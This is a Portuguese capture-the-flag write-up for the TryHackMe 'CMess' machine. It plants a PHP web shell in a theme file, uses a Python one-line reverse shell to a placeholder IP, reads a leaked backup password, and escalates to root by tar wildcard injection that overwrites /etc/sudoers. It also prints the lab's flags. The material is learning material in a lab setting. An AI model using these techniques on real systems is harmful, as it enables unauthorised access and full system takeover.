+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+&lt;?php
+system($_GET["cmd"]); # Retorna web shell que aceita input
+view::stylesheet('lib/gila.min.css');
+view::stylesheet('lib/font-awesome/css/font-awesome.min.css');
+view::head()?&gt;
+&lt;style&gt;
+[...]
+</code></pre></div></div>
+
+<p>Hora de testar o <strong>webshell</strong>, para isso vamos até <strong>cmess.thm</strong> e no final do endereço vamos adicionar “<strong>?cmd=ls</strong>”, para rodar o comando <strong>ls</strong> naquele <strong>webshell</strong>, que nos retornará uma listagem de diretório, bem no começo da página:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439769-64cffdd3-d820-4aef-bb7a-12fefc9d4fa7.png" alt="Pasted image 20220601095445" /></p>
+
+<p>Decidi usar <strong>Python</strong> para obter este <strong>reverse shell</strong>, então para isso vamos descobrir a versão que temos instalada em nosso alvo rodando <strong>“?cmd=Python3 –version”</strong>:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439809-332fb639-371a-42be-aa8d-2b4a9583c62b.png" alt="Pasted image 20220601100556" /></p>
+
+<p>Agora vamos abrir um <strong>listener</strong> em nossa máquina, que irá ficar esperando a conexão da máquina alvo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lnvvvp 6666                                                                     
+Listening on any address 6666
+</code></pre></div></div>
+
+<p>Os comandos que vamos inserir em nosso <strong>webshell</strong> agora serão um pouco mais robustos. <strong>Exemplo de reverse shell em Python com uma linha de código</strong>:<br />
+*Leitura recomendada: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+</code></pre></div></div>
+
+<p>Após inserir este input na página web, em nossa máquina já temos acesso ao <strong>reverse shell</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connection from 10.10.215.52:49564  
+/bin/sh: 0: can't access tty; job control turned off  
+$ pwd     
+/var/www/html  
+$ whoami  
+www-data  
+$
+</code></pre></div></div>
+
+<p>Subi o https://github.com/carlospolop/PEASS-ng em um servidor <strong>HTTP</strong>, baixei o <strong>linpeas.sh</strong> e concedi permissão de execução com “<strong>chmod +x linpeas.sh</strong>”.</p>
+
+<p>Ao executar o arquivo, temos uma saída com inúmeras informações, porém, vamos dar ênfase a dois achados:</p>
+<ul>
+  <li><strong>/tmp/andre_backup.tar.gz</strong></li>
+  <li><strong>/opt/.password.bak</strong></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Backup files (limited 100)  
+-rw-r--r-- 1 root root 161 Jun  1 06:38 /tmp/andre_backup.tar.gz
+[...]
+-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
+[...]
+</code></pre></div></div>
+
+<p>Senha do usuário andre:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /opt/.password.bak  
+andres backup password  
+UQfsdCB7aAP6
+</code></pre></div></div>
+
+<p>Conectando via <strong>ssh</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh andre@cmess.thm  
+andre@cmess.thm's password:    
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)  
+  
+* Documentation:  https://help.ubuntu.com  
+* Management:     https://landscape.canonical.com  
+* Support:        https://ubuntu.com/advantage  
+Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20  
+andre@cmess:~$ ls  
+backup  user.txt
+</code></pre></div></div>
+
+<p>Nossa <strong>primeira flag</strong> se encontra dentro do arquivo <strong>user.txt</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~$ cat user.txt    
+thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+</code></pre></div></div>
+<hr />
+
+<h1 id="segunda-flag">Segunda flag</h1>
+<p><em>Escalate your privileges and obtain <strong>root.txt</strong></em></p>
+
+<p>Lembra do arquivo <strong>/tmp/andre_backup.tar.gz</strong>?
+<strong>Cron</strong> é uma utilidade no <strong>mundo Linux</strong> para automatização de tarefas, no caso de nossa máquina alvo, analisando o <strong>/etc/crontab</strong> vemos que existe um backup do diretório <strong>/home/andre/backup</strong> sendo feito para aquele arquivo que achamos com o <strong>linpeas.sh</strong> anteriormente. Aqui, temos um exemplo de uma <strong>Wildcard Injection</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ cat /etc/crontab  
+# /etc/crontab: system-wide crontab  
+# Unlike any other crontab you don't have to run the `crontab'  
+# command to install the new version when you edit this file  
+# and files in /etc/cron.d. These files also have username fields,  
+# that none of the other crontabs do.  
+  
+SHELL=/bin/sh  
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
+  
+# m h dom mon dow user  command  
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly  
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )  
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )  
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )  
+*/2 *   * * *   root    cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *
+</code></pre></div></div>
+
+<p><strong>Por que</strong> isso caracteriza uma vunerabilidade de <strong>Wildcard Injection</strong>?</p>
+
+<p>A <strong>última entrada</strong> do <strong>output</strong> de nosso <strong>cat</strong> nos diz que:
+A cada <strong>2 minutos</strong>, através do usuário <strong>root</strong>, <strong>TODOS</strong> (indicado pelo <strong>asterísco</strong>) os arquivos na pasta <strong>/home/andre/backup</strong> são comprimidos em um <strong>tar</strong>, que então é enviado até o diretório <strong>/tmp/</strong></p>
+
+<p>Podemos explorar isso e obter privilégio <strong>root</strong> inserindo aqui um <strong>código malicioso</strong> que irá <strong>remover a necessidade do usuário andre de fornecer uma senha ao executar o programa sudo</strong>. Este código será executado pelo nosso <strong>cron</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; safeprogram.sh  
+andre@cmess:~/backup$ echo "" &gt; "--checkpoint-action=exec=sh safeprogram.sh"  
+andre@cmess:~/backup$ echo "" &gt; --checkpoint=1
+andre@cmess:~/backup$ ls -l  
+total 16  
+-rw-rw-r-- 1 andre andre  1 Jun  1 07:59 --checkpoint=1  
+-rw-rw-r-- 1 andre andre  1 Jun  1 07:59 --checkpoint-action=exec=sh safeprogram.sh  
+-rwxr-x--- 1 andre andre 51 Feb  9  2020 note  
+-rw-rw-r-- 1 andre andre 53 Jun  1 07:58 safeprogram.sh
+</code></pre></div></div>
+
+<p>Passado dois minutos, este é o retorno de nosso <strong>sudo -l</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo -l  
+User andre may run the following commands on cmess:  
+   (root) NOPASSWD: ALL
+</code></pre></div></div>
+
+<p>E a partir disso, conseguimos <strong>root</strong> sem sequer inserir a senha:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo bash  
+root@cmess:~/backup#
+</code></pre></div></div>
+
+<p>Na pasta <strong>/root</strong> encontramos nossa <strong>segunda flag</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cmess:~/backup# cd /root  
+root@cmess:/root# ls  
+root.txt  
+root@cmess:/root# cat root.txt    
+thm{9f85b7fdeb2cf96985bf5761a93546a2}  
+root@cmess:/root#
+</code></pre></div></div>]]></content><author><name>Rubick</name></author><category term="writeup" /><summary type="html"><![CDATA[]]></summary></entry></feed>
